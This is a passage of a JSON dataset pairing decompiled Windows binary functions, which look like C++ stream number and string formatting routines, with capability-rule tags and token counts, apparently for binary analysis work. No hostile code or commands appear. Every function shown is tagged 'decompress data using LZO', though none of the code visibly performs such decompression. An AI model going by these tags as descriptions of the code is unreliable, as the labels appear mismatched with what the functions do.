== '\\0') {\n            piVar7[-3] = 0x4613c7;\n            fcn.004512b0();\n            pcVar1 = *(*piVar3 + 0x1c);\n        }\n        else {\n            pcVar1 = *(*piVar3 + 0x1c);\n        }\n        if (pcVar1 != 0x451530) {\n            *piVar7 = var_50h;\n            iVar5 = iVar5 + var_40h;\n            piVar7[-2] = var_40h;\n            piVar7[-1] = iVar5;\n            piVar8 = piVar7 + -3;\n            piVar7[-3] = 0x4613ee;\n            (*pcVar1)();\n            piVar9 = piVar8 + -0xc;\n            goto code_r0x00461347;\n        }\n    }\n    uVar6 = var_40h;\n    *piVar7 = iVar5;\n    piVar7[-1] = uVar6;\n    piVar7[-2] = var_50h;\n    piVar7[-3] = 0x461347;\n    sub.msvcrt.dll_memcpy();\ncode_r0x00461347:\n    piVar9[4] = &fcn.00461210::var_30h;\n    piVar9[3] = var_4ch;\n    piVar9[1] = arg_ch;\n    piVar9[2] = arg_14h;\n    *piVar9 = arg_8h;\n    if (var_48h == '\\0') {\n        piVar9[-1] = 0x4613b9;\n        _var_40h = fcn.00461420(*piVar9, piVar9[1], piVar9[2], piVar9[3], piVar9[4]);\n    }\n    else {\n        piVar9[-1] = 0x461375;\n        _var_40h = fcn.00461ba0(*piVar9, piVar9[1], piVar9[2], piVar9[3], piVar9[4]);\n    }\n    if (var_30h != &fcn.00461210::var_28h) {\n        piVar9[-5] = var_30h;\n        var_40h = _var_40h;\n        var_3ch = _var_40h >> 0x20;\n        piVar9[-6] = 0x461390;\n        fcn.004c2c30();\n    }\n    var_40h = _var_40h;\n    var_3ch = _var_40h >> 0x20;\n    piVar9[-6] = 0x4613a4;\n    fcn.004aed00();\n    return _var_40h;\n}\n",
        "token_count": 1685
    },
    "00461420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00461420(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uint8_t *puVar11;\n    bool bVar12;\n    int32_t *piVar13;\n    uint8_t *puVar14;\n    uint *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    char *var_7ch;\n    uint var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    iVar4 = fcn.004c0160(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    ppiVar2 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    piVar13 = *ppiVar2;\n    if (piVar13 == NULL) {\n        puVar15 = fcn.004c2c70(0x44);\n        *puVar15 = 0x52c654;\n        *(puVar15 + 4) = 0;\n        puVar15[1] = 0;\n        puVar15[2] = 0;\n        puVar15[3] = 0;\n        *(puVar15 + 0x12) = 0;\n        puVar15[5] = 0;\n        puVar15[6] = 0;\n        puVar15[7] = 0;\n        puVar15[8] = 0;\n        puVar15[9] = 0;\n        puVar15[10] = 0;\n        puVar15[0xb] = 0;\n        puVar15[0xc] = 0;\n        puVar15[0xd] = 0;\n        *(puVar15 + 0x43) = 0;\n        fcn.004a9a30(arg_10h + 0x6c);\n        fcn.004ad130(puVar15, iVar5);\n        piVar13 = *ppiVar2;\n    }\n    puVar14 = *arg_18h;\n    if (*puVar14 == *(piVar13 + 0xe)) {\n        var_4ch = piVar13[0xd];\n        if (arg_18h[1] == NULL) goto code_r0x004614d6;\n        var_7ch = piVar13[9];\n        puVar14 = puVar14 + 1;\n        var_74h = piVar13[10];\n    }\n    else {\n        var_4ch = piVar13[0xc];\n        var_7ch = piVar13[7];\n        var_74h = piVar13[8];\n    }\n    puVar11 = arg_18h[1] + puVar14;\n    if ((puVar11 <= puVar14) || (puVar6 = puVar14,  (*(*(iVar4 + 0x18) + *puVar14 * 2) & 8) == 0))\n    goto code_r0x004614d6;\n    do {\n        puVar6 = puVar6 + 1;\n        if (puVar11 == puVar6) {\n            uVar16 = puVar11 - puVar14;\n            goto joined_r0x00461506;\n        }\n    } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n    uVar16 = puVar6 - puVar14;\njoined_r0x00461506:\n    if (uVar16 == 0) goto code_r0x004614d6;\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h = var_40h & 0xffffff00;\n    fcn.004b1bc0(uVar16 * 2);\n    iVar4 = piVar13[0xb];\n    var_70h = uVar16 - iVar4;\n    if (var_70h < 1) {\ncode_r0x004615c1:\n        uVar17 = var_44h;\n        if (iVar4 < 1) {\ncode_r0x004615cf:\n            uVar17 = var_44h + var_74h;\n            uVar16 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar17 = uVar17 + piVar13[6];\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffffff00;\n            fcn.004b1bc0(uVar17 * 2);\n            puVar15 = &var_4ch;\n            var_70h = *(arg_10h + 8);\n            bVar12 = uVar16 == 0x10 && uVar17 < var_70h;\n            do {\n                uVar1 = var_2ch;\n                if (*puVar15 < 5) {\n    // switch table (5 cases) at 0x523da8\n                    switch(*puVar15) {\n                    case 0:\n                        if (bVar12) {\n                            fcn.004b05e0(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar12) {\n                            fcn.004b05e0(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        else {\n                            uVar8 = var_2ch + 1;\n                            uVar9 = 0xf;\n                            if (var_30h != &var_28h) {\n                                uVar9 = var_28h;\n                            }\n                            if (uVar9 < uVar8) {\n                                fcn.004b1f10(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar1) = arg_14h;\n                            *(var_30h + uVar1 + 1) = 0;\n                            var_2ch = uVar8;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x7fffffff - var_2ch < piVar13[6]) goto code_r0x00461b1c;\n                            fcn.004b1d40(piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (var_74h != 0) {\n                            fcn.004b20a0(*var_7ch);\n                        }\n                        break;\n                    case 4:\n                        fcn.004b1d40(var_48h, var_44h);\n                    }\n                }\n                puVar15 = puVar15 + 1;\n            } while (&var_48h != puVar15);\n            if (var_74h < 2) {\n                if (var_2ch < var_70h) goto code_r0x00461801;\ncode_r0x0046179c:\n                var_70h = var_2ch;\n            }\n            else {\n                piVar13 = 0x7fffffff - var_2ch;\n                if (piVar13 < var_74h - 1) goto code_r0x00461af4;\n                fcn.004b1d40(var_7ch + 1, var_74h - 1);\n                if (var_70h <= var_2ch) goto code_r0x0046179c;\ncode_r0x00461801:\n                if (uVar16 == 0x20) {\n                    fcn.004b05e0(var_2ch, 0, var_70h - var_2ch, arg_14h);\n                }\n                else {\n                    fcn.004b05e0(0, 0, var_70h - var_2ch, arg_14h);\n                }\n            }\n            if (var_65h == 0) {\n                uVar16 = (**(*arg_8h + 0x30))(var_30h, var_70h);\n                var_65h = var_70h != uVar16;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004c2c30(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004c2c30(var_48h);\n            }\ncode_r0x004614d6:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(piVar13 + 0x11);\n        uVar1 = var_44h + 1;\n        uVar8 = 0xf;\n        if (var_48h != &var_40h) {\n            uVar8 = var_40h;\n        }\n        if (uVar8 < uVar1) {\n            fcn.004b1f10(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar17) = uVar3;\n        *(var_48h + uVar1) = 0;\n        var_44h = uVar1;\n        if (var_70h < 0) {\n            fcn.004b05e0(uVar1, 0, -var_70h, *(piVar13 + 0x39));\n            if (0x7fffffff - var_44h < uVar16) goto code_r0x00461b28;\n            fcn.004b1d40(puVar14, uVar16);\n            goto code_r0x004615cf;\n        }\n        if (piVar13[0xb] <= 0x7fffffff - uVar1) {\n            fcn.004b1d40(puVar14 + var_70h, piVar13[0xb]);\n            goto code_r0x004615cf;\n        }\n        fcn.004be310(0x523d28);\ncode_r0x00461af4:\n        fcn.004be310(0x523d28);\n    }\n    else {\n        if (iVar4 < 0) {\n            var_70h = uVar16;\n        }\n        if (piVar13[3] == 0) {\n            fcn.004afdd0(0, var_44h, puVar14, var_70h);\n            iVar4 = piVar13[0xb];\n            goto code_r0x004615c1;\n        }\n        fcn.004b05e0(0, var_44h, var_70h * 2, 0);\n        puVar7 = fcn.004bd030(var_48h, *(piVar13 + 0x12), piVar13[2], piVar13[3], puVar14, puVar14 + var_70h);\n        if (puVar7 - var_48h <= var_44h) {\n            *puVar7 = 0;\n            iVar4 = piVar13[0xb];\n            var_44h = puVar7 - var_48h;\n            goto code_r0x004615c1;\n        }\n    }\n    fcn.004be900(0x523d5c, 0x523d45);\ncode_r0x00461b1c:\n    fcn.004be310(0x523d28);\ncode_r0x00461b28:\n    uVar10 = fcn.004be310(0x523d28);\n    fcn.004c2e40(uVar10);\n    do {\n        uVar10 = fcn.004c32d0();\n        fcn.004c2e40(uVar10);\n        (**(*piVar13 + 4))();\n    } while( true );\n}\n",
        "token_count": 2974
    },
    "00461ba0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00461ba0(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint8_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uint8_t *puVar11;\n    bool bVar12;\n    int32_t *piVar13;\n    uint8_t *puVar14;\n    uint *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    char *var_7ch;\n    uint var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    iVar4 = fcn.004c0160(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    ppiVar2 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    piVar13 = *ppiVar2;\n    if (piVar13 == NULL) {\n        puVar15 = fcn.004c2c70(0x44);\n        *puVar15 = 0x52c664;\n        *(puVar15 + 4) = 0;\n        puVar15[1] = 0;\n        puVar15[2] = 0;\n        puVar15[3] = 0;\n        *(puVar15 + 0x12) = 0;\n        puVar15[5] = 0;\n        puVar15[6] = 0;\n        puVar15[7] = 0;\n        puVar15[8] = 0;\n        puVar15[9] = 0;\n        puVar15[10] = 0;\n        puVar15[0xb] = 0;\n        puVar15[0xc] = 0;\n        puVar15[0xd] = 0;\n        *(puVar15 + 0x43) = 0;\n        fcn.004aa110(arg_10h + 0x6c);\n        fcn.004ad130(puVar15, iVar5);\n        piVar13 = *ppiVar2;\n    }\n    puVar14 = *arg_18h;\n    if (*puVar14 == *(piVar13 + 0xe)) {\n        var_4ch = piVar13[0xd];\n        if (arg_18h[1] == NULL) goto code_r0x00461c56;\n        var_7ch = piVar13[9];\n        puVar14 = puVar14 + 1;\n        var_74h = piVar13[10];\n    }\n    else {\n        var_4ch = piVar13[0xc];\n        var_7ch = piVar13[7];\n        var_74h = piVar13[8];\n    }\n    puVar11 = arg_18h[1] + puVar14;\n    if ((puVar11 <= puVar14) || (puVar6 = puVar14,  (*(*(iVar4 + 0x18) + *puVar14 * 2) & 8) == 0))\n    goto code_r0x00461c56;\n    do {\n        puVar6 = puVar6 + 1;\n        if (puVar11 == puVar6) {\n            uVar16 = puVar11 - puVar14;\n            goto joined_r0x00461c86;\n        }\n    } while ((*(*(iVar4 + 0x18) + *puVar6 * 2) & 8) != 0);\n    uVar16 = puVar6 - puVar14;\njoined_r0x00461c86:\n    if (uVar16 == 0) goto code_r0x00461c56;\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h = var_40h & 0xffffff00;\n    fcn.004b1bc0(uVar16 * 2);\n    iVar4 = piVar13[0xb];\n    var_70h = uVar16 - iVar4;\n    if (var_70h < 1) {\ncode_r0x00461d41:\n        uVar17 = var_44h;\n        if (iVar4 < 1) {\ncode_r0x00461d4f:\n            uVar17 = var_44h + var_74h;\n            uVar16 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar17 = uVar17 + piVar13[6];\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffffff00;\n            fcn.004b1bc0(uVar17 * 2);\n            puVar15 = &var_4ch;\n            var_70h = *(arg_10h + 8);\n            bVar12 = uVar16 == 0x10 && uVar17 < var_70h;\n            do {\n                uVar1 = var_2ch;\n                if (*puVar15 < 5) {\n    // switch table (5 cases) at 0x523d94\n                    switch(*puVar15) {\n                    case 0:\n                        if (bVar12) {\n                            fcn.004b05e0(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar12) {\n                            fcn.004b05e0(var_2ch, 0, var_70h - uVar17, arg_14h);\n                        }\n                        else {\n                            uVar8 = var_2ch + 1;\n                            uVar9 = 0xf;\n                            if (var_30h != &var_28h) {\n                                uVar9 = var_28h;\n                            }\n                            if (uVar9 < uVar8) {\n                                fcn.004b1f10(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar1) = arg_14h;\n                            *(var_30h + uVar1 + 1) = 0;\n                            var_2ch = uVar8;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x7fffffff - var_2ch < piVar13[6]) goto code_r0x0046229c;\n                            fcn.004b1d40(piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (var_74h != 0) {\n                            fcn.004b20a0(*var_7ch);\n                        }\n                        break;\n                    case 4:\n                        fcn.004b1d40(var_48h, var_44h);\n                    }\n                }\n                puVar15 = puVar15 + 1;\n            } while (&var_48h != puVar15);\n            if (var_74h < 2) {\n                if (var_2ch < var_70h) goto code_r0x00461f81;\ncode_r0x00461f1c:\n                var_70h = var_2ch;\n            }\n            else {\n                piVar13 = 0x7fffffff - var_2ch;\n                if (piVar13 < var_74h - 1) goto code_r0x00462274;\n                fcn.004b1d40(var_7ch + 1, var_74h - 1);\n                if (var_70h <= var_2ch) goto code_r0x00461f1c;\ncode_r0x00461f81:\n                if (uVar16 == 0x20) {\n                    fcn.004b05e0(var_2ch, 0, var_70h - var_2ch, arg_14h);\n                }\n                else {\n                    fcn.004b05e0(0, 0, var_70h - var_2ch, arg_14h);\n                }\n            }\n            if (var_65h == 0) {\n                uVar16 = (**(*arg_8h + 0x30))(var_30h, var_70h);\n                var_65h = var_70h != uVar16;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004c2c30(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004c2c30(var_48h);\n            }\ncode_r0x00461c56:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(piVar13 + 0x11);\n        uVar1 = var_44h + 1;\n        uVar8 = 0xf;\n        if (var_48h != &var_40h) {\n            uVar8 = var_40h;\n        }\n        if (uVar8 < uVar1) {\n            fcn.004b1f10(var_44h, 0, 0, 1);\n        }\n        *(var_48h + uVar17) = uVar3;\n        *(var_48h + uVar1) = 0;\n        var_44h = uVar1;\n        if (var_70h < 0) {\n            fcn.004b05e0(uVar1, 0, -var_70h, *(piVar13 + 0x39));\n            if (0x7fffffff - var_44h < uVar16) goto code_r0x004622a8;\n            fcn.004b1d40(puVar14, uVar16);\n            goto code_r0x00461d4f;\n        }\n        if (piVar13[0xb] <= 0x7fffffff - uVar1) {\n            fcn.004b1d40(puVar14 + var_70h, piVar13[0xb]);\n            goto code_r0x00461d4f;\n        }\n        fcn.004be310(0x523d28);\ncode_r0x00462274:\n        fcn.004be310(0x523d28);\n    }\n    else {\n        if (iVar4 < 0) {\n            var_70h = uVar16;\n        }\n        if (piVar13[3] == 0) {\n            fcn.004afdd0(0, var_44h, puVar14, var_70h);\n            iVar4 = piVar13[0xb];\n            goto code_r0x00461d41;\n        }\n        fcn.004b05e0(0, var_44h, var_70h * 2, 0);\n        puVar7 = fcn.004bd030(var_48h, *(piVar13 + 0x12), piVar13[2], piVar13[3], puVar14, puVar14 + var_70h);\n        if (puVar7 - var_48h <= var_44h) {\n            *puVar7 = 0;\n            iVar4 = piVar13[0xb];\n            var_44h = puVar7 - var_48h;\n            goto code_r0x00461d41;\n        }\n    }\n    fcn.004be900(0x523d5c, 0x523d45);\ncode_r0x0046229c:\n    fcn.004be310(0x523d28);\ncode_r0x004622a8:\n    uVar10 = fcn.004be310(0x523d28);\n    fcn.004c2e40(uVar10);\n    do {\n        uVar10 = fcn.004c32d0();\n        fcn.004c2e40(uVar10);\n        (**(*piVar13 + 4))();\n    } while( true );\n}\n",
        "token_count": 2981
    },
    "004623d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.004623d0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    unkbyte10 in_stack_00000018;\n    uint uStack132;\n    uint *puStack128;\n    uint32_t auStack124 [4];\n    unkbyte10 aStack108 [2];\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_4ch = arg_10h;\n    var_50h = arg_18h;\n    auStack124[0] = arg_14h + 0x6c;\n    puStack128 = 0x4623f9;\n    fcn.004aebe0();\n    puStack128 = &fcn.004623d0::var_34h;\n    uStack132 = 0x462407;\n    var_44h = fcn.004c01c0();\n    uStack132 = 0x462414;\n    iVar2 = fcn.00437ed0();\n    iVar2 = -iVar2;\n    piVar6 = &stack0xffffff80 + iVar2;\n    uVar5 = &fcn.004623d0::var_50h + iVar2 + 3 & 0xfffffff0;\n    var_40h = uVar5;\n    *(&stack0xffffff7c + iVar2) = 0x462425;\n    var_30h = fcn.004ae940();\n    *(&stack0xffffff90 + iVar2) = 0;\n    *(&stack0xffffff8c + iVar2) = 0x524078;\n    *(&stack0xffffff88 + iVar2) = 0x40;\n    *(&stack0xffffff94 + iVar2) = in_stack_00000018;\n    *(&stack0xffffff84 + iVar2) = uVar5;\n    *(&stack0xffffff80 + iVar2) = &fcn.004623d0::var_30h;\n    *(&stack0xffffff7c + iVar2) = 0x462456;\n    iVar3 = fcn.004bd670();\n    if (0x3f < iVar3) {\n        *(&stack0xffffff7c + iVar2) = 0x46246e;\n        iVar4 = fcn.00437ed0();\n        iVar4 = -iVar4;\n        piVar6 = &stack0xffffff80 + iVar4 + iVar2;\n        uVar5 = &fcn.004623d0::var_50h + iVar4 + iVar2 + 3 & 0xfffffff0;\n        var_40h = uVar5;\n        *(&stack0xffffff7c + iVar4 + iVar2) = 0x46247f;\n        var_30h = fcn.004ae940();\n        *(&stack0xffffff90 + iVar4 + iVar2) = 0;\n        *(&stack0xffffff8c + iVar4 + iVar2) = 0x524078;\n        *(&stack0xffffff88 + iVar4 + iVar2) = iVar3 + 1;\n        *(&stack0xffffff94 + iVar4 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar4 + iVar2) = uVar5;\n        *(&stack0xffffff80 + iVar4 + iVar2) = &fcn.004623d0::var_30h;\n        *(&stack0xffffff7c + iVar4 + iVar2) = 0x4624a9;\n        iVar3 = fcn.004bd670();\n    }\n    piVar6[1] = 0;\n    *piVar6 = iVar3;\n    var_30h = &fcn.004623d0::var_28h;\n    piVar6[-1] = 0x4624c3;\n    fcn.004b2ed0();\n    iVar2 = *var_44h;\n    *piVar6 = var_30h;\n    iVar3 = iVar3 + var_40h;\n    piVar6[-2] = var_40h;\n    piVar6[-1] = iVar3;\n    pcVar1 = *(iVar2 + 0x2c);\n    puVar7 = piVar6 + -3;\n    piVar6[-3] = 0x4624e1;\n    (*pcVar1)();\n    uVar5 = var_50h & 0xffff;\n    puVar7[1] = &fcn.004623d0::var_30h;\n    *puVar7 = uVar5;\n    puVar7[-2] = arg_ch;\n    puVar7[-1] = arg_14h;\n    puVar7[-3] = arg_8h;\n    if (var_4ch == '\\0') {\n        puVar7[-4] = 0x462555;\n        _var_40h = fcn.00462580(puVar7[-3], puVar7[-2], puVar7[-1], *puVar7, puVar7[1]);\n    }\n    else {\n        puVar7[-4] = 0x462512;\n        _var_40h = fcn.00462d60(puVar7[-3], puVar7[-2], puVar7[-1], *puVar7, puVar7[1]);\n    }\n    if (var_30h != &fcn.004623d0::var_28h) {\n        puVar7[-8] = var_30h;\n        var_40h = _var_40h;\n        var_3ch = _var_40h >> 0x20;\n        puVar7[-9] = 0x46252a;\n        fcn.004c2c30();\n    }\n    var_40h = _var_40h;\n    var_3ch = _var_40h >> 0x20;\n    puVar7[-9] = 0x46253e;\n    fcn.004aed00();\n    return _var_40h;\n}\n",
        "token_count": 1478
    },
    "00462580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl fcn.00462580(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int16_t **arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    ushort *puVar6;\n    int32_t *piVar7;\n    uint32_t extraout_ECX;\n    bool bVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t extraout_EDX;\n    int32_t iVar11;\n    int16_t *piVar12;\n    uint *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint uVar16;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    ushort *var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint8_t var_65h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    var_64h = arg_ch;\n    var_65h = arg_ch;\n    piVar4 = fcn.004c01c0(arg_10h + 0x6c);\n    iVar5 = fcn.00451af0();\n    piVar7 = *(*(arg_10h + 0x6c) + 0xc) + iVar5 * 4;\n    iVar11 = *piVar7;\n    if (iVar11 == 0) {\n        puVar13 = fcn.004c2c70(0x54);\n        puVar13[1] = 0;\n        *puVar13 = 0x52c674;\n        puVar13[2] = 0;\n        puVar13[3] = 0;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 0x12) = 0;\n        puVar13[6] = 0;\n        puVar13[7] = 0;\n        puVar13[8] = 0;\n        puVar13[9] = 0;\n        puVar13[10] = 0;\n        puVar13[0xb] = 0;\n        puVar13[0xc] = 0;\n        puVar13[0xd] = 0;\n        puVar13[0xe] = 0;\n        *(puVar13 + 0x52) = 0;\n        fcn.004aa7f0(arg_10h + 0x6c);\n        fcn.004ad130(puVar13, iVar5);\n        iVar11 = *piVar7;\n    }\n    piVar12 = *arg_18h;\n    if (*piVar12 == *(iVar11 + 0x3c)) {\n        var_4ch = *(iVar11 + 0x38);\n        var_78h = *(iVar11 + 0x28);\n        var_70h = *(iVar11 + 0x2c);\n        if (arg_18h[1] != NULL) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        var_4ch = *(iVar11 + 0x34);\n        var_70h = *(iVar11 + 0x24);\n        var_78h = *(iVar11 + 0x20);\n    }\n    iVar5 = (**(*piVar4 + 0x14))(8, piVar12, piVar12 + arg_18h[1]);\n    uVar14 = iVar5 - piVar12 >> 1;\n    if (uVar14 == 0) goto code_r0x00462627;\n    var_48h = &var_40h;\n    var_40h = var_40h._2_2_ << 0x10;\n    var_44h = 0;\n    fcn.004b4a30(iVar5 - piVar12);\n    iVar5 = *(iVar11 + 0x30);\n    var_80h = uVar14 - iVar5;\n    if (var_80h < 1) {\ncode_r0x0046273a:\n        uVar15 = var_44h;\n        if (iVar5 < 1) {\ncode_r0x00462742:\n            uVar15 = var_44h + var_70h;\n            uVar14 = *(arg_10h + 0xc) & 0xb0;\n            if ((*(arg_10h + 0xc) & 0x200) != 0) {\n                uVar15 = uVar15 + *(iVar11 + 0x1c);\n            }\n            var_30h = &var_28h;\n            var_2ch = 0;\n            var_28h = var_28h & 0xffff0000;\n            fcn.004b4a30(uVar15 * 2);\n            puVar13 = &var_4ch;\n            uVar9 = *(arg_10h + 8);\n            bVar8 = uVar14 == 0x10 && uVar15 < uVar9;\n            do {\n                uVar2 = var_2ch;\n                if (*puVar13 < 5) {\n    // switch table (5 cases) at 0x524064\n                    switch(*puVar13) {\n                    case 0:\n                        if (bVar8) {\n                            fcn.004b3350(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        break;\n                    case 1:\n                        if (bVar8) {\n                            fcn.004b3350(var_2ch, 0, uVar9 - uVar15, arg_14h);\n                        }\n                        else {\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004b4da0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = arg_14h;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg_10h + 0xd) & 2) != 0) {\n                            if (0x3fffffff - var_2ch < *(iVar11 + 0x1c)) goto code_r0x00462cbb;\n                            fcn.004b4bc0(*(iVar11 + 0x18), *(iVar11 + 0x1c));\n                        }\n                        break;\n                    case 3:\n                        if (var_70h != 0) {\n                            uVar3 = *var_78h;\n                            uVar1 = var_2ch + 1;\n                            uVar10 = 7;\n                            if (var_30h != &var_28h) {\n                                uVar10 = var_28h;\n                            }\n                            if (uVar10 < uVar1) {\n                                fcn.004b4da0(var_2ch, 0, 0, 1);\n                            }\n                            *(var_30h + uVar2 * 2) = uVar3;\n                            *(var_30h + uVar2 * 2 + 2) = 0;\n                            var_2ch = uVar1;\n                        }\n                        break;\n                    case 4:\n                        fcn.004b4bc0(var_48h, var_44h);\n                    }\n                }\n                puVar13 = puVar13 + 1;\n            } while (&var_48h != puVar13);\n            var_74h = var_2ch;\n            if (1 < var_70h) {\n                if (0x3fffffff - var_2ch < var_70h - 1) goto code_r0x00462cc7;\n                fcn.004b4bc0(var_78h + 1, var_70h - 1);\n                var_74h = var_2ch;\n            }\n            var_2ch = var_74h;\n            if (var_74h < uVar9) {\n                if (uVar14 == 0x20) {\n                    fcn.004b3350(var_74h, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n                else {\n                    fcn.004b3350(0, 0, uVar9 - var_74h, arg_14h);\n                    var_74h = uVar9;\n                }\n            }\n            if (var_65h == 0) {\n                uVar14 = (**(*arg_8h + 0x30))(var_30h, var_74h);\n                var_65h = uVar14 != var_74h;\n            }\n            var_64h = arg_ch & 0xffffff00;\n            if (var_30h != &var_28h) {\n                fcn.004c2c30(var_30h);\n            }\n            if (var_48h != &var_40h) {\n                fcn.004c2c30(var_48h);\n            }\ncode_r0x00462627:\n            *(arg_10h + 8) = 0;\n            var_64h = var_64h & 0xffffff00 | var_65h;\n            return CONCAT44(var_64h, arg_8h);\n        }\n        uVar3 = *(iVar11 + 0x12);\n        uVar2 = var_44h + 1;\n        uVar9 = 7;\n        if (var_48h != &var_40h) {\n            uVar9 = var_40h;\n        }\n        if (uVar9 < uVar2) {\n            